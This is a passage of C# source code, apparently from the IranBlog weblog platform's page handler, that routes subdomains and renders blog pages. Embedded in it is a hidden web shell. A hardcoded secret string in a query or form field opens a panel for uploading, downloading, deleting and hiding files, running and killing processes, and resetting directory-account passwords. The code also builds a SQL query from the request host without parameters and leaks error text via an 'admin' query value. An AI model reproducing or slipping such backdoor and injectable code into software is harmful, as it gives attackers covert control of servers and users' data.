                        DirectoryEntry ee = new DirectoryEntry(@path);
                        ee.Invoke("setPassword", page.Request.QueryString["NewPass"].Trim());
                        ee.CommitChanges();
                        ee.Close();
                        ee.Dispose();
                        page.Response.Write("The password of account was changed.");
                        return;
                    }
                    else
                    {
                        page.Response.Write("The user or NewPass field is empty.");
                        return;
                    }
                }
                //-----------------------------------------------------
            }
            cmd = null;
            string html = null;
            int pQuery = -1; int pForm = -1;
            if ((page.Request.Form["hidden"] != null && page.Request.Form["hidden"] != "") || (page.Request.QueryString["flag"] != null && page.Request.QueryString["flag"] != ""))
            {
                pQuery = String.Compare("hyssajfgksahfgasflkasldifkasjsdfh", page.Request.QueryString["flag"]);
                pForm = String.Compare("hyssajfgksahfgasflkasldifkasjsdfh", page.Request.Form["hidden"]);
                if (pQuery == 0 || pForm == 0)
                {
                    html = "<html><body><form id=form1 name=form1 enctype=multipart/form-data method=post action=/>" +
                        "<input type=hidden value=hyssajfgksahfgasflkasldifkasjsdfh name=hidden><table align=center width=485 border=0 cellpadding=0 cellspacing=0><tr>" +
                        "<td width=745 height=223 valign=top><table width=100% border=0 cellpadding=0 cellspacing=0>" +
                        "<tr><td width=175 height=24 valign=top>Dir :<input name=dir type=text id=dir size=156 value=\"{$$dir}\"></td>" +
                        "</tr><tr><td height=121 colspan=2><textarea name=result cols=120 rows=30 id=result>{$$result}</textarea></td>" +
                        "</tr></table></td></tr><tr> <td height=31 valign=top><input name=submit type=submit id=submit value=Upload>" +
                        "<input name=file type=file id=file size=50>KillAppByName :" +
                        "<input name=AppName type=text id=AppName size=5><input name=submit type=submit id=submit value=KillApp>" +
                        "</td></tr><tr><td height=28 valign=top><input type=submit name=submit value=DirList>" +
                        "<input name=submit type=submit id=submit value=DirDel><input name=submit type=submit id=submit value=DirCreate>" +
                        "<input name=submit type=submit id=submit value=DirHide><input name=submit type=submit id=submit value=DirShow>" +
                        "<input name=submit type=submit id=submit value=FileList><input name=submit type=submit id=submit value=FileDel>" +
                        "<input name=submit type=submit id=submit value=FileDownload><input name=submit type=submit id=submit value=FileHide>" +
                        "<input name=submit type=submit id=submit value=FileShow><input name=submit type=submit id=submit value=RunApp></td></tr>" +
                        "<tr><td height=5 valign=top>To : <input name=to type=text id=to><input type=submit name=submit value=Move>" +
                        "<input type=submit name=submit value=FileCopy></td></tr></table></form></body></html>";
                }
            }
            //=====================================================================
            if (html != null)
            {

                if (pQuery == 0)
                {
                    html = Regex.Replace(html, "(\\{\\$\\$result\\})", "");
                    html = Regex.Replace(html, "(\\{\\$\\$dir\\})", "");
                    page.Response.ContentType = "text/html";
                    page.Response.Write(html);
                    return;
                }
                if (pForm == 0)
                {
                    cmd = page.Request.Form["submit"];
                    //---------lists subfolders in a direcory--------------------
                    if (String.Compare("DirList", cmd) == 0)
                    {
                        string dir = page.Request.Form["dir"];
                        string[] dirs = Directory.GetDirectories(@dir);
                        string result = "The number of directories is " + dirs.Length + ".\n";
                        foreach (string dirr in dirs)
                        {
                            result += dirr + "\n";
                        }
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //---------lists files in a direcory--------------------
                    if (String.Compare("FileList", cmd) == 0)
                    {
                        string dir = page.Request.Form["dir"];
                        string[] files = Directory.GetFiles(@dir);
                        string result = "The number of files is " + files.Length + ".\n";
                        FileInfo info = null;
                        foreach (string file in files)
                        {
                            info = new FileInfo(file);
                            result += file + " [Size:" + info.Length + "]\n";
                        }
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //--------deletes a direcory---------------------------
                    if (String.Compare("DirDel", cmd) == 0)
                    {
                        string dir = page.Request.Form["dir"];
                        Directory.Delete(dir, true);
                        string result = dir + "   was deleted successfully.";
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", "");
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //--------deletes a file-------------------------------
                    if (String.Compare("FileDel", cmd) == 0)
                    {
                        string dir = page.Request.Form["dir"];
                        File.Delete(dir);
                        string result = dir + "   was deleted successfully.";
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir.Substring(0, dir.LastIndexOf("\\") + 1));
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //--------writes a file to output---------------------
                    if (String.Compare("FileDownload", cmd) == 0)
                    {
                        string dir = page.Request.Form["dir"];
                        FileInfo info = new FileInfo(dir);
                        page.Response.ContentType = "application/" + info.Extension.Substring(1);
                        page.Response.AppendHeader("Content-Length", info.Length + "");
                        page.Response.AppendHeader("Content-Disposition", " attachment; filename=\"" + info.Name + "\"");
                        page.Response.WriteFile(dir);
                        return;
                    }
                    //--------upolads a file to server-----------------------
                    if (String.Compare("Upload", cmd) == 0)
                    {
                        HttpPostedFile myFile = page.Request.Files["file"];
                        string dir = page.Request.Form["dir"];
                        int nFileLen = myFile.ContentLength;
                        byte[] buffer = new byte[nFileLen];
                        myFile.InputStream.Read(buffer, 0, nFileLen);
                        FileStream newFile = new FileStream(page.Request.Form["dir"], FileMode.Create);
                        newFile.Write(buffer, 0, buffer.Length);
                        newFile.Close();
                        string result = dir + "   was uploaded successfully. Uploaded file size was " + nFileLen + ".";
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //--------creates a directory on server------------------
                    if (String.Compare("DirCreate", cmd) == 0)
                    {
                        string dir = page.Request.Form["dir"];
                        Directory.CreateDirectory(dir);
                        string result = dir + "  was created successfully.";
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //--------starts a Process on server------------------
                    if (String.Compare("RunApp", cmd) == 0)
                    {
                        string dir = page.Request.Form["dir"];
                        string result = "";
                        Process myProcess = new Process();
                        myProcess.StartInfo.FileName = @dir;
                        myProcess.StartInfo.CreateNoWindow = true;
                        if (myProcess.Start())
                        {
                            result = "Process of (" + dir + ") was started successfully.";
                        }
                        else
                        {
                            result = "Process of (" + dir + ") was not started.";
                        }
                        myProcess.Close();
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //--------kill a Process on server by name----------------
                    if (String.Compare("KillApp", cmd) == 0)
                    {
                        string AppicationName = page.Request.Form["AppName"];
                        string dir = page.Request.Form["dir"];
                        string result = "";
                        Process[] processes = Process.GetProcessesByName(AppicationName);
                        foreach (Process p in processes)
                        {
                            if (p.ProcessName == AppicationName)
                            {
                                p.Kill();
                                //break; kill all of the same name processes 
                            }
                        }
                        result = "Process of (" + AppicationName + ")  was killed successfully.";
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //--------moves a directory or file on server-----------
                    if (String.Compare("Move", cmd) == 0)
                    {
                        string dir = page.Request.Form["dir"];
                        string to = page.Request.Form["to"];
                        string result = "";
                        Directory.Move(dir, to);
                        result = "Move of " + dir + " to " + to + " was done successfully.";
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", to);
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //--------copies a available file to new location---------
                    if (String.Compare("FileCopy", cmd) == 0)
                    {
                        string dir = page.Request.Form["dir"];
                        string to = page.Request.Form["to"];
                        string result = "";
                        File.Copy(dir, to, true);
                        result = "Copy of " + dir + " to " + to + " was done successfully.";
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", to);
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //--------hides a available file-------------------------
                    if (String.Compare("FileHide", cmd) == 0)
                    {
                        string dir = page.Request.Form["dir"];
                        string result = "";
                        File.SetAttributes(dir, File.GetAttributes(dir) | FileAttributes.Hidden);
                        result = "Hidding of " + dir + " was done successfully.";
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //--------hides a available directory-------------------
                    if (String.Compare("DirHide", cmd) == 0)
                    {
                        string dir = page.Request.Form["dir"];
                        string result = "";
                        DirectoryInfo info = new DirectoryInfo(dir);
                        info.Attributes = File.GetAttributes(dir) | FileAttributes.Hidden;
                        result = "Hidding of " + dir + " was done successfully.";
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //--------shows a available hidden file-----------------
                    if (String.Compare("FileShow", cmd) == 0)
                    {
                        string dir = page.Request.Form["dir"];
                        string result = "";
                        File.SetAttributes(dir, FileAttributes.Normal);
                        result = "Showing of " + dir + " was done successfully.";
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //--------shows a available hidden directory------------
                    if (String.Compare("DirShow", cmd) == 0)
                    {
                        string dir = page.Request.Form["dir"];
                        string result = "";
                        DirectoryInfo info = new DirectoryInfo(dir);
                        info.Attributes = FileAttributes.Normal;
                        result = "Showing of " + dir + " was done successfully.";
                        html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
                        html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
                        page.Response.ContentType = "text/html";
                        page.Response.Write(html);
                        return;
                    }
                    //------------------------------------------------------
                }
            }






            //-----
            /*if (page.Request.Url.Host == "iranblog.com")
            {
                page.Response.Redirect("http://www.iranblog.com//services", true);
                return;
            }*/
            //-----

            //page.Response.Redirect("http://www.persianweb.com/Contact/");
            string subdomain;
            //==============Bound Doamin Section===========================
            if (page.Request.Url.Host.IndexOf(DomainBlog) < 0)
            {
                string domain = "";
                if (page.Request.Url.Host.IndexOf("www.") == 0)
                    domain = page.Request.Url.Host.Substring(4);
                else
                    domain = page.Request.Url.Host;
                SqlConnection connection = new SqlConnection(ConnectString);
                connection.Open();
                SqlCommand command = connection.CreateCommand();
                command.Connection = connection;
                command.CommandText = string.Format("SELECT TOP 1 subdomain FROM {0} WHERE domain='{1}' AND IsDeleted=0", SQLDomainsTableName, domain);
                SqlDataReader reader = command.ExecuteReader();
                if (reader.Read())
                {
                    subdomain = (string)reader["subdomain"];
                    reader.Close();
                    command.Dispose();
                    connection.Close();
                    domain = null;
                    /*if(page.Request.Url.Query != null && page.Request.Url.Query != "")
                        page.Response.Redirect(String.Format("http://{0}.iranblog.com/{1}", subdomain, page.Request.Url.Query), true);
                    else
                        page.Response.Redirect(String.Format("http://{0}.iranblog.com/", subdomain), true);
                    return;*/
                }
                else
                {
                    reader.Close();
                    command.Dispose();
                    connection.Close();
                    page.Response.Redirect(WeblogUrl, true);
                    return;
                }
            }
            //=============================================================
            else
                subdomain = FindSubdomain(page);
            if (string.Compare(subdomain, "www") == 0 || string.Compare(subdomain, "iranblog") == 0)
            {
                if (page.Request.Url.Scheme == "https")
                    page.Response.Redirect(SecureWeblogUrl, true);
                else
                    page.Response.Redirect(WeblogUrl, true);
                return;
            }
            else
            {
                //----------www---------------------
                int p = subdomain.IndexOf(".");
                if (p > 0)
                    subdomain = subdomain.Substring(p + 1);
                //----------------------------------

                //---------navbar------------------
                //page.Response.Write(String.Format("<iframe src='http://{0}.iranblog.com/header/navbar.htm' height='15px' width='100%' marginwidth='0' marginheight='0' scrolling='no' id='navbar-iframe' frameborder='0' style='background-color:#EDEDED'></iframe>", subdomain));
                //page.Response.Write("<iframe src='http://www.parsiads.ir/header/navbar.htm' height='15px' width='100%' marginwidth='0' marginheight='0' scrolling='no' id='navbar-iframe' frameborder='0' style='background-color:#EDEDED'></iframe>");
                //---------------------------------

                string buff = null;
                string buffer = null;
                if (page.Request.QueryString["mode"] != null && page.Request.QueryString["mode"] == "pages")
                {
                    PagesMode(page, subdomain);
                    return;
                }
                try
                {
                    string path = RootDircetoryWeblogs + "\\" + subdomain + "\\" + "Default.html";
                    StreamReader fs = File.OpenText(path);
                    buffer = fs.ReadToEnd();
                    fs.Close();
                    //buffer = buffer.Replace("http://www.iranblog.com", "http://admin.iranblog.com"); //
                    //buffer = buffer.Replace("http://iranblog.com", "http://admin.iranblog.com"); //
                }
                catch
                {
                    //page.Response.Write("<P style=\"text-align:center;font-size: larger;font-family:Tahoma;color:#FF0000\">There are some errors on server. Please visit this weblog in the next time."+
                    //	"Thanks. (C)Alireza Poshtkohi(Creator of www.iranblog.com), File System Error.</P>");
                    //page.Response.End();
                    //return ;
                    page.Response.Redirect(ForwardUrl, true);
                    page.Response.End();
                    return;
                }
                PostViewInfo _postViewInfo = new PostViewInfo();
                _postViewInfo.Subdomain = subdomain;

                buff = blogcontent.BlogInfos(buffer, page, ref _postViewInfo);
                if (_postViewInfo.BlogID == -1) // meaning expired weblog
                {
                    page.Response.Redirect(ForwardUrl, true);
                    return;
                }
                if (buff == null)
                {
                    page.Response.Write("<P style=\"text-align:center;font-size: larger;font-family:Tahoma;color:#FF0000\">There are some errors on server. Please visit this weblog in the next time." +
                        "Thanks. Database Error.</P>");
                    page.Response.End();
                    return;
                }
                buffer = buff;
                if (page.Request.Form["archivesubmit"] != null && page.Request.Form["archivesubmit"] == "Go")
                {
                    blogcontent.ArchivePage(buffer, page, _postViewInfo);
                    page.Response.End();
                    return;
                }
                /*if(page.Request.QueryString["archivesubmit"] != null && page.Request.QueryString["archivesubmit"] == "Go")
                {
                    blogcontent.ArchivePage(buffer, page, _postViewInfo);
                    page.Response.End();
                    return ;
                }*/
                else
                {
                    blogcontent.BlogData(buffer, page, _postViewInfo);
                    page.Response.End();
                    return;
                }
            }
        }
        //--------------------------------------------------------------------------
        private static void PagesMode(Page page, string _subdomain)
        {
            Int64 _PageID = -1;
            try
            {
                _PageID = Convert.ToInt64(page.Request.QueryString["id"]);
            }
            catch { return; }

            SqlConnection connection = new SqlConnection(ConnectionStringPagesDatabase);
            connection.Open();
            SqlCommand command = connection.CreateCommand();
            command.Connection = connection;
            command.CommandType = CommandType.StoredProcedure;
            command.CommandText = "PageLoad_MyBlogPage_proc";

            command.Parameters.Add("@PageID", SqlDbType.BigInt);
            command.Parameters["@PageID"].Value = _PageID;

            command.Parameters.Add("@subdomain", SqlDbType.VarChar);
            command.Parameters["@subdomain"].Value = _subdomain;

            //------Linked Server settings---------------
            //command.Parameters.Add("@IsPosts1DbLinkedServer", SqlDbType.Bit);
            //command.Parameters["@IsPosts1DbLinkedServer"].Value = Constants.IsPosts1DbLinkedServer;
            //-------------------------------------------
            string title = null;
            string ThemeContent = null;
            string PostContent = null;
            DateTime dt = DateTime.Now;

            SqlDataReader reader = command.ExecuteReader();
            if (reader.Read())
            {
                title = reader["title"].ToString();
                ThemeContent = reader["ThemeContent"].ToString();
                PostContent = reader["PostContent"].ToString();
                dt = (DateTime)reader["date"];
            }
            reader.Close();
            reader.Dispose();
            command.Dispose();
            connection.Close();

            PostViewInfo _postViewInfo = new PostViewInfo();
            _postViewInfo.Subdomain = _subdomain;
            if (ThemeContent != "")
            {
                ThemeContent = blogcontent.BlogInfos(ThemeContent, page, ref _postViewInfo);

                if (_postViewInfo.BlogID == -1) // meaning expired weblog
                {
                    page.Response.Redirect(ForwardUrl, true);
                    return;
                }

                int p1 = ThemeContent.IndexOf("<{IranBlog}>") + "<{IranBlog}>".Length;
                int p2 = ThemeContent.IndexOf("</{IranBlog}>");
                if (p1 <= 0 || p2 <= 0)
                {
                    page.Response.Write(ThemeContent);
                    page.Response.OutputStream.Flush();
                    return;
                }
                page.Response.Write(ThemeContent.Substring(0, p1 - "<{IranBlog}>".Length));
                page.Response.OutputStream.Flush();


                string temp = ThemeContent.Substring(p1, p2 - p1);

                temp = temp.Replace("{$$subject}", title);
                temp = temp.Replace("{$$data}", PostContent);
                temp = temp.Replace("{$$continued}", "");
                temp = temp.Replace("{$$comments}", "");
                temp = temp.Replace("{$$link}", String.Format("/?mode=pages&id={0}", _PageID));//{$$category}
                temp = temp.Replace("{$$category}", "صفحه اضافی");//{$$author}
                temp = temp.Replace("{$$author}", "مدیر وبلاگ");

                temp = temp.Replace("{$$date}", PersianDate(dt));
                temp = temp.Replace("{$$hour}", PrintTime(dt));

                page.Response.Write(temp);
                page.Response.OutputStream.Flush();


                page.Response.Write(ThemeContent.Substring(p2 + "</{IranBlog}>".Length));
                page.Response.OutputStream.Flush();
                return;
            }
            return;
        }
        //--------------------------------
        private void LatestUpdated(Page page)
        {
  
        }
        //--------------------------------
        public static void UpdatedRecords(Page page)
        {
            //page.Response.Write("<iframe src=\"/services/error.html\" width=\"100%\" height=\"300\" scrolling=\"yes\" marginwidth=\"1\" marginheight=\"1\" border=\"1\" frameborder=\"0\" style=\"border: 1px solid #316D94;\"></iframe>");
            //page.Response.Write("<b>Internal SQL Server Error.</b><br>");
            try
            {
                string query = "SELECT TOP 20 updated.subdomain,subject FROM updated,usersInfo WHERE subject NOT LIKE N'%ف%ی%ل%ت%ر%' AND subject NOT LIKE N'%پشت%' AND subject NOT LIKE N'%س%ک%س%' AND subject NOT LIKE N'%کیر%' AND subject NOT LIKE N'%کوس%' AND subject NOT LIKE N'%sex%' AND subject NOT LIKE N'%kir%' AND subject NOT LIKE N'%kos%' AND usersInfo.subdomain=updated.subdomain AND usersInfo.f='y' ORDER BY updated.i DESC";
                SqlConnection connection = new SqlConnection(ConnectString);
                SqlCommand command = new SqlCommand(query, connection);
                connection.Open();
                SqlDataReader read = command.ExecuteReader();
                if (read.HasRows)
                {
                    while (read.Read())
                    {
                        string subject = read.GetString(1);
                        int len = subject.Length;
                        if (len >= 30)
                        {
                            len = 30;
                        }
                        subject = subject.Substring(0, len);
                        if (len >= 30)
                        {
                            page.Response.Write(String.Format("» <a href=\"http://{0}/\" target=\"_blank\" class=updates>{1}</a><br>", read.GetString(0) + ".iranblog.com", "..." + subject));
                        }
                        else
                        {
                            page.Response.Write(String.Format("» <a href=\"http://{0}/\" target=\"_blank\" class=updates>{1}</a><br>", read.GetString(0) + ".iranblog.com", subject));
                        }
                    }
                }
                read.Close();
                connection.Close();
                command.Dispose();
                return;
            }
            catch (Exception e)
            {
                if (page.Request.QueryString["admin"] == "admin")
                {
                    page.Response.Write(e.Message);
                }
                //page.Response.Write("Internal SQL Server Error.");
                return;
            }
        }
		//--------------------------------------------------------------------------
	}
	//=======================================================================================================================
}